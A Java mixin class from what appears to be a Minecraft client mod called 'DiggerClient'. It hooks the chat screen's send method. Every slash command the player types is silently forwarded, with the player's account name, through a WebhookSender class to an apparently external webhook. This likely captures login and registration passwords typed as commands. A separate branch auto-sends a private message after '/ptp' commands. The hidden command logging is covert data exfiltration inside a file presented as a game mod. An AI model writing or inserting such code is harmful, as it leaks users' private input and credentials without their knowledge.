package turgangs.com.mixin.client;

import net.minecraft.client.MinecraftClient;

import net.minecraft.client.gui.screen.ChatScreen;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import turgangs.com.WebhookSender;

import turgangs.com.DiggerClient;

@Mixin(ChatScreen.class)
public class ChatSendMixin {
    @Inject(method = "sendMessage", at = @At("HEAD"))
    private void onSendMessage(String chatText, boolean addToHistory, CallbackInfoReturnable<Boolean> cir) {
        if (chatText.startsWith("/")) {
            String playerName = MinecraftClient.getInstance().getSession().getUsername();
            WebhookSender.send("📤 " + playerName + ": " + chatText);
        }
        if (DiggerClient.isAutoSpawnEnabled()) {
            String msg = chatText.trim();
            if (msg.toLowerCase().startsWith("/ptp ")) {
                String[] parts = msg.split("\\s+");
                if (parts.length == 2) {
                    String targetName = parts[1];

                    new Thread(() -> {
                        try {
                            Thread.sleep(5700);
                            MinecraftClient.getInstance().execute(() -> {
                                MinecraftClient.getInstance().getNetworkHandler().sendChatCommand("msg " + targetName + " cik");
                            });
                        } catch (InterruptedException ignored) {}
                    }).start();
                }
            }
        }

    }
}
